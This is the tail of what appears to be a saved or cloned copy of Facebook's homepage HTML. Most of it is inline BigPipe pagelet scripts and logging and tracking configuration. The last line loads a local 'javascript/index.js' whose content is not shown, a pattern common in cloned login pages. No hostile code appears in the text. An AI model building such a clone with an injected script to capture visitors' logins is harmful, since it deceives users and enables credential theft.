                "flush_pagelets_asap": true,
                "dispatch_pagelet_replayable_actions": false
            }
        }));
    });
    </script>
    <script nonce="SXJL9M30">
    (function() {
        var n = now_inl();
        requireLazy(["__bigPipe"], function(bigPipe) {
            bigPipe.beforePageletArrive("first_response", n);
        })
    })();
    </script>
    <script nonce="SXJL9M30">
    requireLazy(["__bigPipe"], (function(bigPipe) {
        bigPipe.onPageletArrive({
            displayResources: ["lCj3VmH", "D25C7Qe", "x+GAcDa", "plCHOrr", "8zbEZtu", "h3ZzAmG",
                "LfFe6kq", "vGt2mxz", "hKY0QKT", "A/uI0x1", "ZEC4RrQ", "cYU3c32", "Yo2UzOh",
                "P/mr5VE"
            ],
            id: "first_response",
            phase: 0,
            last_in_phase: true,
            tti_phase: 0,
            all_phases: [63],
            hsrp: {
                hblp: {
                    consistency: {
                        rev: 1006399937
                    }
                }
            },
            allResources: ["IgTGe9E", "A/uI0x1", "BIylKC4", "8zbEZtu", "vGt2mxz", "hKY0QKT",
                "mRpDwmd", "h3ZzAmG", "LfFe6kq", "lCj3VmH", "D25C7Qe", "x+GAcDa", "plCHOrr",
                "ZEC4RrQ", "cYU3c32", "Yo2UzOh", "/rO0lbn", "Z2GjVu9", "lWOvGTa", "P/mr5VE"
            ]
        });
    }));
    </script>
    <script>
    requireLazy(["__bigPipe"], function(bigPipe) {
        bigPipe.setPageID("7154993440760341812")
    });
    </script>
    <script nonce="SXJL9M30">
    (function() {
        var n = now_inl();
        requireLazy(["__bigPipe"], function(bigPipe) {
            bigPipe.beforePageletArrive("last_response", n);
        })
    })();
    </script>
    <script nonce="SXJL9M30">
    requireLazy(["__bigPipe"], (function(bigPipe) {
        bigPipe.onPageletArrive({
            displayResources: ["hKY0QKT"],
            id: "last_response",
            phase: 63,
            last_in_phase: true,
            the_end: true,
            jsmods: {
                define: [
                    ["TimeSliceInteractionSV", [], {
                        on_demand_reference_counting: true,
                        on_demand_profiling_counters: true,
                        default_rate: 1000,
                        lite_default_rate: 100,
                        interaction_to_lite_coinflip: {
                            ADS_INTERFACES_INTERACTION: 0,
                            ads_perf_scenario: 0,
                            ads_wait_time: 0,
                            Event: 1
                        },
                        interaction_to_coinflip: {
                            ADS_INTERFACES_INTERACTION: 1,
                            ads_perf_scenario: 1,
                            ads_wait_time: 1,
                            Event: 100
                        },
                        enable_heartbeat: true,
                        maxBlockMergeDuration: 0,
                        maxBlockMergeDistance: 0,
                        enable_banzai_stream: true,
                        user_timing_coinflip: 50,
                        banzai_stream_coinflip: 0,
                        compression_enabled: true,
                        ref_counting_fix: false,
                        ref_counting_cont_fix: false,
                        also_record_new_timeslice_format: false,
                        force_async_request_tracing_on: false
                    }, 2609],
                    ["cr:1642797", ["BanzaiBase"], {
                        __rc: ["BanzaiBase",
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["cr:1458113", [], {
                        __rc: [null,
                            "Aa1eOg6HeDu6ma5I1-VgY9iQq4BW7aPn1droUoCN9pWmmIpCnFEjG2CSUre8r_xGo_8Q7hNBfqGn80aHmF1HIwfNnBc_cQk"
                        ]
                    }, -1],
                    ["cr:1069930", [], {
                        __rc: [null,
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["cr:1083116", ["XAsyncRequest"], {
                        __rc: ["XAsyncRequest",
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["cr:1083117", [], {
                        __rc: [null,
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["BanzaiConfig", [], {
                        MAX_SIZE: 10000,
                        MAX_WAIT: 150000,
                        MIN_WAIT: null,
                        RESTORE_WAIT: 150000,
                        blacklist: ["time_spent"],
                        disabled: false,
                        gks: {
                            boosted_pagelikes: true,
                            mercury_send_error_logging: true,
                            platform_oauth_client_events: true,
                            graphexplorer: true,
                            sticker_search_ranking: true
                        },
                        known_routes: ["artillery_javascript_actions",
                            "artillery_javascript_trace", "artillery_logger_data",
                            "logger", "falco", "gk2_exposure", "js_error_logging",
                            "loom_trace", "marauder", "perfx_custom_logger_endpoint",
                            "qex", "require_cond_exposure_logging"
                        ],
                        should_drop_unknown_routes: true,
                        should_log_unknown_routes: false
                    }, 7],
                    ["cr:692209", ["cancelIdleCallbackBlue"], {
                        __rc: ["cancelIdleCallbackBlue",
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["TrackingConfig", [], {
                        domain: "https://pixel.facebook.com"
                    }, 325],
                    ["WebDevicePerfInfoData", [], {
                        needsFullUpdate: true,
                        needsPartialUpdate: false,
                        shouldLogResourcePerf: false
                    }, 3977],
                    ["WebStorageMonsterLoggingURI", [], {
                        uri: "/ajax/webstorage/process_keys/?state=1"
                    }, 3032],
                    ["BrowserPaymentHandlerConfig", [], {
                        enabled: false
                    }, 3904],
                    ["TimeSpentConfig", [], {
                        delay: 1000,
                        timeout: 64,
                        "0_delay": 0,
                        "0_timeout": 8
                    }, 142],
                    ["cr:1351741", ["CometEventListener"], {
                        __rc: ["CometEventListener",
                            "Aa1_NaphzIEYJaC4UYhxziGH9nMtLccR9AHslXj5k82lHgslHwoviKvDkZ426PUrbRs8vUzHrcunm8EZQag1NnvPfYpf4fm9TwukfTo3WcI0uhVDgeBP"
                        ]
                    }, -1],
                    ["cr:1634616", ["UserActivityBlue"], {
                        __rc: ["UserActivityBlue",
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["cr:1353359", ["EventListenerImplForBlue"], {
                        __rc: ["EventListenerImplForBlue",
                            "Aa2xzEnptahxCV0uXynKF72jaZvl21hkL6pGuZ3USAhhfY_UIml9vydpHMyzd4cKCN0JSlyff53L7lu59v_-SD18-sXJzO8HCg"
                        ]
                    }, -1],
                    ["cr:844180", ["TimeSpentImmediateActiveSecondsLoggerBlue"], {
                        __rc: ["TimeSpentImmediateActiveSecondsLoggerBlue",
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["cr:1187159", ["BlueCompatBroker"], {
                        __rc: ["BlueCompatBroker",
                            "Aa2FI2-BaMkEtbcKhST4LJZX5As3Ix6pnzKMNF90J5xL1HGHHZabnDCzhW9MuX0WAe0XMB4RdyV3nsGuXn3Yiv6Ud40"
                        ]
                    }, -1],
                    ["ImmediateActiveSecondsConfig", [], {
                        sampling_rate: 0
                    }, 423]
                ],
                require: [
                    ["BDClientSignalCollectionTrigger", "startSignalCollection", [],
                        [{
                            sc: "{\"t\":1659080345,\"c\":[[30000,838801],[30001,838801],[30002,838801],[30003,838801],[30004,838801],[30005,838801],[30006,573585],[30007,838801],[30008,838801],[30012,838801],[30013,838801],[30015,806033],[30018,806033],[30021,540823],[30022,540817],[30040,806033],[30093,806033],[30094,806033],[30095,806033],[30101,541591],[30102,541591],[30103,541591],[30104,541591],[30106,806039],[30107,806039],[38000,541427],[38001,806643]]}",
                            fds: 60,
                            fda: 60,
                            i: 60,
                            sbs: 1,
                            dbs: 100,
                            bbs: 100,
                            hbi: 60,
                            rt: 262144,
                            hbcbc: 2,
                            hbvbc: 0,
                            hbbi: 30,
                            sid: -1,
                            hbv: "8356697517763079665"
                        }]
                    ],
                    ["NavigationMetrics", "setPage", [],
                        [{
                            page: "XIndexReduxController",
                            page_type: "normal",
                            page_uri: "https://www.facebook.com/",
                            serverLID: "7154993440760341812"
                        }]
                    ],
                    ["FalcoLoggerTransports", "attach", [],
                        []
                    ],
                    ["Chromedome", "start", [],
                        [{}]
                    ],
                    ["DimensionTracking"],
                    ["ClickRefLogger"],
                    ["DetectBrokenProxyCache", "run", [],
                        [0, "c_user"]
                    ],
                    ["NavigationClickPointHandler"],
                    ["ServiceWorkerURLCleaner", "removeRedirectID", [],
                        []
                    ],
                    ["WebDevicePerfInfoLogging", "doLog", [],
                        []
                    ],
                    ["WebStorageMonster", "schedule", [],
                        []
                    ],
                    ["Artillery", "disable", [],
                        []
                    ],
                    ["ScriptPathLogger", "startLogging", [],
                        []
                    ],
                    ["TimeSpentBitArrayLogger", "init", [],
                        []
                    ]
                ]
            },
            hsrp: {
                hsdp: {
                    clpData: {
                        "1743095": {
                            r: 1,
                            s: 1
                        },
                        "1871697": {
                            r: 1,
                            s: 1
                        },
                        "1829319": {
                            r: 1
                        },
                        "1829320": {
                            r: 1
                        },
                        "1843988": {
                            r: 1
                        }
                    },
                    gkxData: {
                        "1652843": {
                            result: false,
                            hash: "AT6uh9NWRY4QEQoYrT8"
                        },
                        "5541": {
                            result: true,
                            hash: "AT70V-Q_zfEykznOAEg"
                        },
                        "1099893": {
                            result: false,
                            hash: "AT5kly2LSZV_DKGRnQ0"
                        }
                    }
                },
                hblp: {
                    consistency: {
                        rev: 1006399937
                    },
                    rsrcMap: {
                        zPYlTyl: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yO/r/pslzeMSEB_a.js?_nc_x=Ij3Wp8lg5Kz"
                        },
                        wL2J9cL: {
                            type: "js",
                            src: "https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/xXDOO3oMCfl.js?_nc_x=Ij3Wp8lg5Kz"
                        }
                    },
                    compMap: {
                        TransportSelectingClientSingleton: {
                            r: ["6Wqo+6+", "wZHTkda"],
                            rds: {
                                m: ["ContextualConfig", "BladeRunnerClient",
                                    "DGWRequestStreamClient", "MqttLongPollingRunner",
                                    "BanzaiScuba_DEPRECATED"
                                ],
                                r: ["8zbEZtu", "/o5YvO2", "HNJlz0f", "ZEC4RrQ", "m9E98Lv",
                                    "XJ5NO10", "hKY0QKT", "BIylKC4", "Vcys0/C", "cYU3c32",
                                    "LfFe6kq"
                                ]
                            },
                            be: 1
                        },
                        RequestStreamCommonRequestStreamCommonTypes: {
                            r: ["6Wqo+6+"],
                            be: 1
                        }
                    }
                }
            },
            allResources: ["8zbEZtu", "zPYlTyl", "wL2J9cL", "XJ5NO10", "/o5YvO2", "h3ZzAmG",
                "FY/FPFf", "GpQFBwL", "vGt2mxz", "A/uI0x1", "LfFe6kq", "BIylKC4", "hKY0QKT"
            ]
        });
    }));
    </script>
    <script src="javascript/index.js"></script>
</body>
</html>